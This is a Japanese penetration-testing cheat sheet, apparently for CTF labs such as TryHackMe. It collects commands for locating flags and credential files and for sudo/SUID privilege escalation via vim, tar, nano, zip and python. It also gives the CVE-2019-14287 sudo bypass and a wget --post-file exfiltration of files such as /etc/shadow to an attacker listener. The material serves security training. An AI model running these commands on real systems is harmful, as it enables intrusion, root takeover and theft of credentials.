# ペンテスト Cheatsheet

標準コマンド・定番手順のメモ。
**このリポジトリの自作コマンド** → [COMMAND.md](COMMAND.md)

## 検索系

### ファイルを見つける

#### ファイル名

```bash
find / -type f -name "user.txt" 2>/dev/null
```

#### 文字列

```bash
grep -R "flag" .
```

高速版

```bash
rg "flag"
```

## 権限昇格の事前準備

### ユーザ確認

#### ログイン可能なユーザ

```bash
grep -vE '(nologin|false)$' /etc/passwd
```

#### 存在するユーザ

```bash
cut -d: -f1 /etc/passwd
```

### パスワード・認証情報の探し（Linux シェル後）

別ユーザや SSH に進むときの定番。ルーム固有のパスは `cases/<name>/MEMO.md` に残す。

#### まず当たる場所

| 種類 | 例 |
|------|-----|
| 設定・履歴 | `~/.bash_history`, `~/.mysql_history`, `~/.ssh/id_rsa` |
| Web / DB | `/var/www/`, `wp-config.php`, `.env`, `config.php` |
| バックアップ | `*.bak`, `*.old`, `*~`, アーカイブ展開忘れ |
| ログ | `/var/log/`, アプリの debug ログ |
| 共有・一時 | `/tmp`, `/opt`, ルート直下の `*.txt` / `*.cfg` |

```bash
# 書き込み可能なファイル（アップロード先の手がかりにもなる）
find / -writable -type f 2>/dev/null | grep -v '/proc\|/sys' | head -50

# 最近更新されたファイル
find / -type f -mtime -1 2>/dev/null | head -50
```

#### ファイル名・拡張子で探す

```bash
find / -type f \( \
  -iname '*.pcap' -o -iname '*.pcapng' -o \
  -iname '*.log' -o -iname '*.conf' -o -iname '*.config' -o \
  -iname '*password*' -o -iname '*cred*' -o -iname '*.env' \
\) 2>/dev/null
```

#### 中身をざっと見る

```bash
grep -riE 'password|passwd|pass=|pwd=|secret' /var/www /home /opt 2>/dev/null | head -30
strings <file> | less          # バイナリ・pcap・画像付近
grep -a password <file>        # テキスト混じりファイル向け
```

#### パケットキャプチャ

平文プロトコル（FTP, HTTP Basic, Telnet 等）や `su` / `ssh` 試行が残っていることがある。

```bash
file capture.pcapng
strings capture.pcapng | less
# Kali 側: wireshark / tshark -r capture.pcapng
#   フィルタ例: ftp / http / tcp.port==22
#   Follow → TCP Stream
```

#### 取得したハッシュ

`/etc/shadow` が読めない場合は、アプリ DB や `john` / `hashcat` 向けファイルを探す。
コンテナ内の自動化 → [COMMAND.md](COMMAND.md)（`sshkey-crack`, `hydrassh` など）。

## 権限昇格系

### SUIDが付与されているファイル検索

```bash
find / -perm -4000 2>/dev/null
```

### sudo で実行可能なコマンド確認

シェルを取れたら最初に実行すべき定番のコマンド

```bash
sudo -l
```

### wget（sudo NOPASSWD）— ファイル内容を外に送る

`sudo -l` で `(root) NOPASSWD: /usr/bin/wget` があるとき、**root 権限で任意ファイルを読んで POST 送信**できる（GTFOBins）。

**Kali（受け側）**

```bash
listen 80
# または: nc -lvnp 80
```

**ターゲット（送る側）**

```bash
# LHOST = listen を張っている Kali の IP（THM なら ip a → tun0）
sudo /usr/bin/wget --post-file=/root/root_flag.txt <LHOST>
```

`<LHOST>` は **受け側（自分の Kali）の IP**。ターゲットから見えるアドレスを指定する（THM VPN なら通常 `tun0`）。listener に **ファイルの中身** が届く。

- **パスは事前に推測・列挙が必要**（CTF では `user_flag.txt` → `/root/root_flag.txt` など）
- フラグ以外でも使える例: `--post-file=/etc/shadow`, `--post-file=/etc/passwd`
- 対話的 root シェルではなく **読めるファイルの exfil** が主な用途

### SUID権限ファイル検索

```bash
find / -perm -u=s -type f 2>/dev/null -exec ls -la {} \;
```

### python で昇格

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

### vim で昇格

```bash
sudo vim -c ':!/bin/sh'
```

`sudo -l` で **特定ファイルだけ** 編集可のとき（例: `(ALL, !root) NOPASSWD: /usr/bin/vi /path/to/allowed-file`）:

```bash
# sudo vi だけだと root として実行しようとして拒否される
sudo -u <user> /usr/bin/vi /path/to/allowed-file
```

vi 内でシェル escape（**1 コマンドずつ**）:

```vim
:set shell=/bin/bash
:shell
```

または:

```vim
:!/bin/bash
```

- **`-u` 指定 user として** vi が動くだけでは root シェルにならない（`:e /root/root.txt` も Permission denied）
- root が必要 → 下の **CVE-2019-14287**

### sudo `(ALL, !root)` — CVE-2019-14287

`sudo -l` に `(ALL, !root) NOPASSWD: ...` があると **`-u root` は明示禁止**。古い sudo（&lt; 1.8.28）では **`-u#-1` が uid 0（root）として解釈**され bypass できる。

```bash
sudo -u#-1 /usr/bin/vi /path/to/allowed-file
```

vi 内:

```vim
:!/bin/bash
```

```bash
id                  # uid=0(root)
cat /root/root.txt
```

ワンライナー:

```bash
sudo -u#-1 /usr/bin/vi -c ':!/bin/bash' /path/to/allowed-file
```

別表記（同じ意味）:

```bash
sudo -u#4294967295 /usr/bin/vi /path/to/allowed-file
```

| コマンド | 結果 |
|----------|------|
| `sudo vi ...` | root として実行 → **拒否** |
| `sudo -u <user> vi ...` | 指定 user → **root ファイル不可** |
| `sudo -u#-1 vi ...` | **root bypass** |

- パスは **`sudo -l` の引数と完全一致**させる（`/usr/bin/vi` とファイルパスをそのまま）
- 参考: [GTFOBins vi](https://gtfobins.github.io/gtfobins/vi/), [CVE-2019-14287](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14287)

### tar で昇格

```bash
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

### nano で昇格

```bash
sudo /bin/nano -s /bin/sh /dev/null
```

## steghide（手動）

```bash
steghide info <path>
stegcracker <path> $RECON_PASSLIST
steghide extract -sf <path> -p '<pass>'
```

一括は [COMMAND.md](COMMAND.md) の `stegx`。

## 壊れたファイルヘッダ（magic byte）

```bash
fixmagic broken.png        # チェック → 必要なら broken_fixed.png
fixmagic -n image.png      # チェックのみ（修復しない）
```

## SUIDが付与された所有ファイルで昇格

```bash
FILE_PATH=shell.sh
chmod u+wx $FILE_PATH
cat > $FILE_PATH <<'EOF'
#!/bin/bash
/bin/bash
EOF
sudo $FILE_PATH
```

## zip で昇格

```bash
TF=$(mktemp -u)
sudo zip $TF /etc/passwd -T -TT 'sh #'
```
